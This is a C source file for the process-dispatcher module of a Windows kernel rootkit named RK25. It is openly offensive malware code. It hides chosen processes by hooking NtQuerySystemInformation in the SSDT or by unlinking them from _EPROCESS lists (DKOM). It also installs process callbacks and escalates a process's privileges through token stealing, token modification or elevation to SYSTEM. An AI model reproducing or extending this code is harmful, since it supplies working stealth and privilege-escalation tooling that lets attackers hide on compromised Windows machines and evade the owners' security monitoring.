#pragma once
#include "rk25_proc.h"

#define RK25_PROLOG_PROC "Process Dispatcher"

VOID RK25ProcessInit() {
	RK25HideProcessInit();
	RK25PrivProcessInit();
	RK25DKOMProcessInit();
	RK25CallbackInit();
}

VOID RK25ProcessFree() {
	RK25HideProcessFree();
	RK25PrivProcessFree();
	RK25DKOMProcessFree();
	RK25CallbackFree();
}

NTSTATUS RK25ProcessHook(ULONG attr) {
	if (attr & RK25_HOOK_SSDT_NTQSI_REPLACE || attr & RK25_HOOK_SSDT_NTQSI_SPLICING) return RK25HideProcessHook(attr);
	else if (attr & RK25_HOOK_SSDT_NTTP_REPLACE) return RK25CallbackHook(attr);
	else return STATUS_NOT_SUPPORTED;
}

NTSTATUS RK25GetProcessIdByName(PUNICODE_STRING unic, PHANDLE pid) {
	NTSTATUS status;
	PVOID buffer = NULL;
	ULONG bufferSize = 0;

	ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
	buffer = ExAllocatePoolWithTag(PagedPool, bufferSize, 'DNIF');
	if (!buffer) return STATUS_INSUFFICIENT_RESOURCES;

	status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);
	if (!NT_SUCCESS(status)) {
		ExFreePoolWithTag(buffer, 'DNIF');
		return status;
	}

	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && RtlEqualUnicodeString(&pInfo->ImageName, unic, TRUE)) {
			*pid = pInfo->UniqueProcessId;
			break;
		}
		if (pInfo->NextEntryOffset == 0) break;
		pInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pInfo + pInfo->NextEntryOffset);
	}

	ExFreePoolWithTag(buffer, 'DNIF');

	if (!*pid) return STATUS_NOT_FOUND;

	PEPROCESS process;
	status = PsLookupProcessByProcessId(*pid, &process);
	if (NT_SUCCESS(status)) {
		ObDereferenceObject(process);
		return STATUS_SUCCESS;
	}

	return status;
}

NTSTATUS RK25ProcessHideByPID(ULONG attr, HANDLE pid) {
	NTSTATUS status = STATUS_SUCCESS;

	if (attr & RK25_ACTION_DISABLE) {
		if (attr & RK25_PROCESS_AS_EPROCESS) {
			RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Restore PID (EPROC): %d", (ULONG_PTR)pid);
			RK25DKOMProcessRestore(pid);
		}
		else {
			RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Restore PID (Query): %d", (ULONG_PTR)pid);
			RK25HideProcessDel(pid);
		}

		RK25CallbackDel(pid);
	}
	else if (attr & RK25_ACTION_ENABLE) {
		if (attr & RK25_PROCESS_AS_EPROCESS) {
			if (!RK25DKOMProcessGetByPID(pid)) {
				RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Hide PID (EPROC): %d", (PULONG_PTR)pid);
				status = RK25DKOMProcessHide(pid);
				if (!NT_SUCCESS(status)) {
					RK25_DBG_ERR_F(RK25_PROLOG_PROC, "Hide operation is failed with code: 0x%X", status);
				}
				else if (attr & RK25_PROCESS_CALLBACK) {
					RK25CallbackInstall(pid, RK25DKOMProcessUnhide);
				}
			}
			else {
				RK25_DBG_WARN_F(RK25_PROLOG_PROC, "Process PID:%d is already hided (EPROC)", (PULONG_PTR)pid);
				status = STATUS_ALREADY_INITIALIZED;
			}
		}
		else {
			if (!RK25HideProcessGetByPID(pid)) {
				RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Hide PID (Query): %d", (PULONG_PTR)pid);
				RK25HideProcessAddByPID(pid);

				if (attr & RK25_PROCESS_CALLBACK) RK25CallbackInstall(pid, RK25HideProcessDel);
			}
			else {
				RK25_DBG_WARN_F(RK25_PROLOG_PROC, "Process PID:%d is already hided (Query)", (PULONG_PTR)pid);
				status = STATUS_ALREADY_INITIALIZED;
			}
		}
	}
	else {
		RK25_DBG_ERR(RK25_PROLOG_PROC, "Action is not defined");
		status = STATUS_INVALID_PARAMETER;
	}
	return status;
}

NTSTATUS RK25ProcessHideByName(ULONG attr, CONST PCHAR name) {
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING unic;
	ANSI_STRING ansi;
	PRK25_PD data = NULL;
	PEPROCESS proc = NULL;
	HANDLE pid = 0;

	RtlInitAnsiString(&ansi, (PCSZ)name);
	if (!ansi.Length) return STATUS_INVALID_PARAMETER;

	status = RtlAnsiStringToUnicodeString(&unic, &ansi, TRUE);
	if (status) return status;

	RK25_DBG_INFO(RK25_PROLOG_PROC, "Search process name via ZwQuerySystemInformation...");
	status = RK25GetProcessIdByName(&unic, &pid);
	if (status) {
		RK25_DBG_INFO(RK25_PROLOG_PROC, "Search process name in _EPROCESS...");
		proc = RK25SearchEProcByName(&unic); // search in _EPROCESS
		if (proc) pid = PsGetProcessId(proc);
		else {
			RK25_DBG_INFO(RK25_PROLOG_PROC, "Search process name in hided _EPROCESS...");
			PRK25_DKOM_PD data = RK25DKOMProcessGetByName(&unic); // search in hided _EPROCESS
			if (data) pid = data->pid;
			else return STATUS_NOT_FOUND;
		}
	}
	RtlFreeUnicodeString(&unic);
	RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Found process pid: %d", (ULONG)pid);
	return RK25ProcessHideByPID(attr, pid);
}

NTSTATUS RK25ProcessHide(ULONG attr, PVOID target) {
	if (!target) return STATUS_INVALID_PARAMETER;

	if (attr & RK25_TARGET_STRING) {
		return RK25ProcessHideByName(attr, (PCHAR)target);
	}
	else if (attr & RK25_TARGET_DECIMAL) {
		return RK25ProcessHideByPID(attr, (HANDLE)target);
	}
	else return STATUS_NOT_SUPPORTED;
}

NTSTATUS RK25ProcessPriv(ULONG attr, HANDLE pid) {
	NTSTATUS status = STATUS_SUCCESS;
	if (attr & RK25_ACTION_DISABLE) {
		if (RK25PrivProcessGet(pid)) {
			RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Restore priv for PID: %d", (PULONG_PTR)pid);
			status = RK25PrivProcessRestore(pid);
		}
		else {
			RK25_DBG_INFO_F(RK25_PROLOG_PROC, "PID:%d is not found", (PULONG_PTR)pid);
			status = STATUS_NOT_FOUND;
		}
	}
	else if (attr & RK25_ACTION_ENABLE) {
		if (attr & RK25_PROCESS_STEALING) {
			RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Priv (stealing) PID: %d", (PULONG_PTR)pid);
			status = RK25PrivProcessUpStealing(pid);
		}
		else if (attr & RK25_PROCESS_MODIFY) {
			RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Priv (modify) PID: %d", (PULONG_PTR)pid);
			status = RK25PrivProcessUpModify(pid);
		}
		else if (attr & RK25_PROCESS_TO_SYSTEM) {
			RK25_DBG_INFO_F(RK25_PROLOG_PROC, "Priv (up to sys) PID: %d", (PULONG_PTR)pid);
			status = RK25PrivProcessUpToSystem(pid);
		}
		else {
			RK25_DBG_ERR(RK25_PROLOG_PROC, "Operation is not defined");
			status = STATUS_INVALID_PARAMETER;
		}
	}
	else {
		RK25_DBG_ERR(RK25_PROLOG_PROC, "Action is not defined");
		status = STATUS_INVALID_PARAMETER;
	}
	return status;
}